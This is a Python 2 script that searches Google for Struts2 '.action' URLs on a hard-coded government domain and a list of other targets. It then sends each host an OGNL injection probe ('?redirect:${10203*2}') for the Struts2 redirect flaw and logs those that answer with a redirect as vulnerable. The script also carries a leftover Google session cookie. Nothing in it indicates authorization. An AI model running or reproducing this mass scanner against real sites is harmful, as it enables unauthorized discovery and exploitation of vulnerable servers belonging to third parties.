import urllib2, httplib, urlparse
import re, os


fin = open("./ycinput.txt", mode='r')
data = fin.read()
data = data.split()
fout = open("./output_action.txt", mode='w')
# global res,res2



def google():
	for i in range(12):
		pn = (i)*10
		url = 'https://www.google.com.hk/search?q=site:'+keywords+'+filetype:action&start='+str(pn)			
		# url = 'https://www.google.com.hk/search?q=site:edu+filetype:do&start='+str(pn)
		print url
		req = urllib2.Request(url)
		req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0")
		# req.add_header("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3")
		# req.add_header("Accept-Encoding", "gzip, deflate")
		# req.add_header("Referer", "http://www.google.com.hk/webhp?hl=zh-CN&sourceid=cnhp")
		# req.add_header("Host", "www.google.com.hk")
		# req.add_header("Cookie", "PREF=ID=1f8d29def4b6d695:U=827b1f8a6ea13796:FF=1:LD=zh-CN:NW=1:TM=1374825532:LM=1375084211:S=0hGljxHnglAmZcn_; NID=67=XLs1UGPvbCR05k_9MgC6wKQI8lDxPZgVDLwLfx8qY6eXcTwkB9KV8g3dZeKa7iYhYf8FOPKgYLTkMYGHGJY0_KsVBuSTsFXDuqHlY4f2n4Q5AhRfX-wxswcjhhsT9nV5; GDSESS=ID=260b775a5097d907:TM=1375106861:C=c:IP=218.108.166.23-:S=APGng0tfEzaFYgw6-XEs9HYVwAGbcIiAbQ")
		try:
			res = urllib2.urlopen(req)
			print 'ok1'
		except:
			print 'error open'
			if(i>2):
				return
			continue
		html = res.read()
		# print 'ok2'
		# print html
		# print res.info()

		reg = re.compile(r'<cite>(.*?action).*?</cite>')
		urls = reg.findall(html)
		if not urls:
			print 'reg none'
			return
		res.close()
		#print urls

		for domain in urls:
			if domain is None:
				print keywords+'none'
				return
			print domain
			struts2_url = 'http://'+domain
			print struts2_url
			tmp = urlparse.urlparse(struts2_url)
			host = tmp[1]
			path = tmp[2]
			# print host,path
			if struts2_test(host,path):
				return 

def struts2_test(host,path):
	struts2_exp = "?redirect:${10203*2}"
	try:
	    conn = httplib.HTTPConnection(host,80)
	    conn.request('GET',path+struts2_exp)
	    res2 = conn.getresponse()
	    if res2.status == 302:
	        print host+path+struts2_exp
	        location = res2.getheader("Location")
	        print "=====>"+location+'++++>struts2 vul exist?'
	        fout.write(host+path+'\n')
	        # return True
	    conn.close()
	except Exception, e:
	    print e



keywords = 'wsbs.zjjxw.gov.cn'
google()

# global keywords
# for value in data:
# 	print value
# 	keywords = value
# 	google()
fin.close
fout.close()
